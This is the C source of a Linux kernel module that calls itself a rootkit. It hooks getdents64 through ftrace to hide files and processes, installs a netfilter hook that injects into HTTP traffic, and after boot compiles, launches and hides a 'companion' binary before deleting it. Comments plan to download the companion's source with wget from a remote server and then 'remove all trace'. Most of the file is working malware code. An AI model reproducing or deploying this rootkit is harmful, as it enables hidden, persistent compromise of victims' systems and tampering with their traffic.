#include "http_injector.h"
#include "hide.h"

int g_pid_companion = -1;

asmlinkage long (*g_original_getdents)(const struct pt_regs *);

static t_ftrace_hook *f_hook[] = {&(t_ftrace_hook){
    .name = "__x64_sys_getdents64",
    .function = (myGetDents),
    .original = (&g_original_getdents),
}, NULL};

static struct nf_hook_ops nfho = {
      .hook        = http_nf_hookfn,
      .hooknum     = NF_INET_LOCAL_OUT,
      .pf          = PF_INET,
      .priority    = NF_IP_PRI_FIRST
};

static struct delayed_work delayed_init_work;
static struct workqueue_struct *delayed_init_wq;

static bool is_system_ready(void)
{
    struct path p;

    // Check if /sys is mounted
    printk(KERN_INFO "Checking if /sys is mounted...\n");
    if (kern_path("/sys", 0, &p) == 0) {
        // Check if it's a directory (mount point)
        if (S_ISDIR(p.dentry->d_inode->i_mode)) {
            path_put(&p); // Release the path reference
            printk(KERN_INFO "/sys is mounted\n");
        } else {
            path_put(&p);
            printk(KERN_INFO "/sys is not mounted properly\n");
            return false;
        }
    } else {
        printk(KERN_INFO "/sys is not available\n");
        return false;
    }

    // Check if /proc is mounted
    printk(KERN_INFO "Checking if /proc is mounted...\n");
    if (kern_path("/proc", 0, &p) == 0) {
        if (S_ISDIR(p.dentry->d_inode->i_mode)) {
            path_put(&p); // Release the path reference
            printk(KERN_INFO "/proc is mounted\n");
        } else {
            path_put(&p);
            printk(KERN_INFO "/proc is not mounted properly\n");
            return false;
        }
    } else {
        printk(KERN_INFO "/proc is not available\n");
        return false;
    }

    // Check if /dev is mounted (i.e., the devtmpfs is ready)
    printk(KERN_INFO "Checking if /dev is mounted...\n");
    if (kern_path("/dev", 0, &p) == 0) {
        if (S_ISDIR(p.dentry->d_inode->i_mode)) {
            path_put(&p); // Release the path reference
            printk(KERN_INFO "/dev is mounted\n");
        } else {
            path_put(&p);
            printk(KERN_INFO "/dev is not mounted properly\n");
            return false;
        }
    } else {
        printk(KERN_INFO "/dev is not available\n");
        return false;
    }

    // If we reach here, critical filesystems are mounted, the system is ready for userland applications
    printk(KERN_INFO "System is ready for userland tasks\n");

    // You can now perform other checks or launch userland applications.
    // For example, checking if the system is ready to compile or run applications.

    return true;
}

// More precise checks for user login readiness
static int is_user_login_possible(void)
{
    // Check display manager or login service status
    struct path login_path;

    // Check for display manager socket or service
    if (kern_path("/run/systemd/sessions", 0, &login_path) == 0) {
        path_put(&login_path);
        return 1;
    }

    // Alternative: Check specific login services
    // Like gdm (GNOME), lightdm, etc.
    return 0;
}

static int wait_for_user_login(void)
{
    int timeout = 300; // 5 minute maximum wait

    while (timeout > 0) {
        // Check login services
        if (is_user_login_possible()) {
            printk(KERN_INFO "User login services are ready\\n");
            return 0;
        }

        // Sleep between checks
        msleep(1000); // 1-second intervals
        timeout--;
    }

    printk(KERN_ERR "User login services did not become ready\\n");
    return -ETIMEDOUT;
}

static void delayed_module_init_work(struct work_struct *work)
{
    // Check if system is ready
    if (is_system_ready()) {
        printk(KERN_INFO "System ready, performing delayed module initialization\\n");
  compile_companion();
  launch_companion();
  get_pid_companion();
  delete_binary();

  // Protocol:

  // Probably have to run a gcc .c
  // We could host the .c on a github or any server
  // So we would like download the .c, with a wget
  // Then compile it gcc
  // Then launch the companion
  // Then remove all trace

  // So it has to be obfuscate from ps : How do we get the PID ?
  // It's possible to get the pid of a kernelModule with current->pid

  // a mettre dans un fichier pour faire la logic

    printk(KERN_INFO "pid %d\n", g_pid_companion);

    if (fh_install_hook(f_hook[0])) {
      printk(KERN_INFO "Bruh minstall hook eroor\n");
    }


        return;
    }

    // If not ready, requeue the work
    queue_delayed_work(delayed_init_wq,
                       &delayed_init_work,
                       msecs_to_jiffies(5000)); // 5-second interval
}



static int __init rootkit_init(void) {
  printk(KERN_INFO "%i\n", current->pid);

  nfho.hooknum = NF_INET_PRE_ROUTING; 
  nfho.priv = init_search_map();

  if (nfho.priv != NULL) {
    fill_search_dict((search_map_t *)nfho.priv);
    nf_register_net_hook(&init_net, &nfho);
  }

  // success = success && my_func(...)
  printk(KERN_INFO "Rootkit has been loaded\n");

  // Create a dedicated workqueue
    delayed_init_wq = create_singlethread_workqueue("delayed_module_init");
    if (!delayed_init_wq) {
        printk(KERN_ERR "Failed to create workqueue\\n");
        return -ENOMEM;
    }

    // Initialize delayed work
    INIT_DELAYED_WORK(&delayed_init_work, delayed_module_init_work);

    // Queue initial work
    queue_delayed_work(delayed_init_wq,
                       &delayed_init_work,
                       msecs_to_jiffies(5000)); // First check after 5 seconds

    printk(KERN_INFO "Module preliminary init complete, background initialization queued\n");

//  wait_for_user_login();
//  compile_companion();
//  launch_companion();
//  get_pid_companion();

  // Protocol:

  // Probably have to run a gcc .c
  // We could host the .c on a github or any server
  // So we would like download the .c, with a wget
  // Then compile it gcc
  // Then launch the companion
  // Then remove all trace

  // So it has to be obfuscate from ps : How do we get the PID ?
  // It's possible to get the pid of a kernelModule with current->pid

  // a mettre dans un fichier pour faire la logic

//    printk(KERN_INFO "pid %d\n", g_pid_companion);

//    if (fh_install_hook(f_hook[0])) {
//      printk(KERN_INFO "Bruh minstall hook eroor\n");
 //   }

    return 0;
}

static void __exit rootkit_exit(void) {
  search_map_t *map;
  
  if (nfho.priv != NULL) {
    map = (search_map_t *)nfho.priv;

    free_search_map(map);
    nf_unregister_net_hook(&init_net, &nfho);
  }
   if (delayed_init_wq) {
        cancel_delayed_work_sync(&delayed_init_work);
        destroy_workqueue(delayed_init_wq);
    }

  fh_remove_hook(f_hook[0]);
  printk(KERN_INFO "Rootkit has been unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
MODULE_LICENSE("GPL");
